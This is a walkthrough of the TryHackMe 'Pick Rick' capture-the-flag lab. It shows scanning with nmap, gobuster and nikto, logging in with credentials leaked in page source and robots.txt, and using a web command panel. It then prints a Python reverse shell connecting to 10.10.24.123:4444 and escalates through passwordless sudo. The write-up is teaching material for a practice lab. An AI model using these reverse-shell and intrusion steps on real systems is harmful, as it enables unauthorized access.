This is a detailed walkthrough of tryhackme CTF title Pick Rick: This Rick and Morty-themed CTF revolves around exploiting a vulnerable web server to find three ingredients to transform Rick from a pickle back to human state.

## Scanning

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -A -v $ip -oN nmap.txt
```

Command break down:

-A: This flag enables aggressive scanning. It combines various scan types (like OS detection, version detection, script scanning, and traceroute) into a single scan.

-v: increases verbosity, providing more detailed output during the scan.

—$ip: provides the target IP we stored as the variable $ip.

-oN nmap.txt: This option specifies normal output that should be saved to a file named “nmap.txt.

This scan reveals two open ports:

![nmap_result](https://github.com/user-attachments/assets/9cffca0f-cd9d-44e0-99eb-7bd522615f25)

# Enumeration

### **Analysis Port 80/TCP**

Let's check out the websever on port 80/TCP.

I checked the source code and revealed a username in the html comments:

![pagesource](https://github.com/user-attachments/assets/23742b21-e765-47e8-8788-cc3d68224727)


Now let's run a directory scan on the target using gobuster:

```bash
gobuster dir -u $ip -w=/usr/share/wordlists/dirb/common.txt -x txt,php,html -o buster.txt
```
Command break down:

dir: Specifies that we want to perform directory brute-forcing.

-u $ip: The -u flag followed by the target IP address or hostname indicates the URL to scan.

-w=/usr/share/wordlists/dirb/common.txt: This option specifies the wordlist to use for directory brute-forcing. In this case, it uses the common wordlist located at /usr/share/wordlists/dirb/common.txt.

-x txt,php,html: The -x flag specifies file extensions to search for. Here, we’re looking for files with extensions .txt, .php, and .html.

-o buster.txt: The -o flag specifies the output file where the results will be saved. In this case, it saves the output to a file named “buster.txt.”

We found two interesting directories:

![buster](https://github.com/user-attachments/assets/005f3530-538e-4fb7-a809-9c0379e1e99b)

```bash
/login.php
/robots.txt
```

Robots.txt can often reveal vulnerabilities in a web server, or inadvertently leaked information. 
Let's also run a nikto scan on the target IP:

```bash
nikto -h $ip | tee nikto.txt
```
Command break down:
-h $ip: The -h option specifies the target host

| tee nikto.txt: The tee command allows you to save the output to a file (nikto.txt) 

![nikto](https://github.com/user-attachments/assets/2be2bf43-af1f-4a72-929a-76fdcbce784f)

This again reveals the /login.php directory among other information.

Browsing to /login.php , we are redirected to a log in page :

![login](https://github.com/user-attachments/assets/8ffd221c-cca9-4f8e-bee7-36c19203e518)

Navigating to robots.txt reveals a strange word that looks like it might be a login password.

Let's try logging in with the username we found earlier from the sourcecode and the potential password from robots.txt.

# Gaining privileges

Success! We are now logged in!

We are presented with a command panel. 

Running the command id reveals that we are www-data:

```bash
id
```
![id](https://github.com/user-attachments/assets/3366d92d-5891-44e8-8dce-2f462c7998d9)

Now, let's run ls -la to see what files are available: 

```bash
ls -la
```
![ls -la](https://github.com/user-attachments/assets/ec5f253e-5e29-4132-afb8-42615a23012e)

Let's run the cat command on clue.txt:

![cat](https://github.com/user-attachments/assets/5a99da24-b9ab-430f-8347-eaf843b8b82e)

The cat command is disabled. Let's try some other commands with similiar functionality to cat, like less. 
less works and the contents display: Look around the file system for the other ingredient.
Ok, let's run less on Sup3rS3cretPickl3Ingred.txt.
And this returns our first secret ingredient!

# Expolitation

Let's try to get more access to this web server with a reverse shell. 
As a test, let's run a simple python command:

```bash
python3 -c 'print("test")'
```
The command works and displayed test. This let's us know that we can run python3 commands. So, let's try running a reverse shell in python3. 
I often like to use the site "https://www.revshells.com/" because it has a large colletion of reverse shell, with a simple interface to input 
your IP and desired port number, as well as showing the nc listener.

Scroll down on through the list of reverse shells on the bottom left until you get to Python3 shortest. In our situation with the command panel,
I find that shorter shells tend to have a high success rate.

Shell for input on command panel:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.24.123",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

nc listener for output on our terminal:
```bash
nc -lvnp 4444
```

Alright! We have a reverse shell as www-data! Let's run the command env to get a summary of environmental varialbles:

![env](https://github.com/user-attachments/assets/fc127f2a-363d-4178-9f22-c83e649baa39)

Ok, the first thing I like to do is run a few commands to upgrade our shell's functionality and stability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
ctrl -z
stty raw -echo; fg
stty rows 38 columns 116
```

Now that we have upgraded the shell, let's check for privileges of www-data:

Command:
```bash
sudo -l
```
![sudo -l](https://github.com/user-attachments/assets/19ce7691-b99e-4672-b0db-c1f42841d650)

This is great news as it indicates we can execute any command with no password!
Let's explore the file system and get the other flags. First, let's check the home directory:
Command:
```bash
ls /home
```
We see two directories in home: rick and ubuntu. Now, we'll navigate to /home/rick.
Command:
```bash
cd /home/rick
ls -lah
```

Great! Let's use less to see the contents of the 2nd ingredient, don't forget to use '' due to the space.


![2nd](https://github.com/user-attachments/assets/da82fe39-0967-4c92-a433-042f5c4d7539)

We now have the second ingredient! 
Let's check the root directory for the 3rd one. A couple things to note. We will need to use the sudo command with no pasword to display the 3rd flag. I also noticed that we actually can use the cat command in our shell.
```bash
sudo ls /root
sudo cat /root/3rd.txt
```

And we now have the 3rd flag! I hope you enjoyed this CTF and it was a good learning experience. Remember that there are different approaches that you can take in the room to get the same results, so try some different approaches and techniques. 

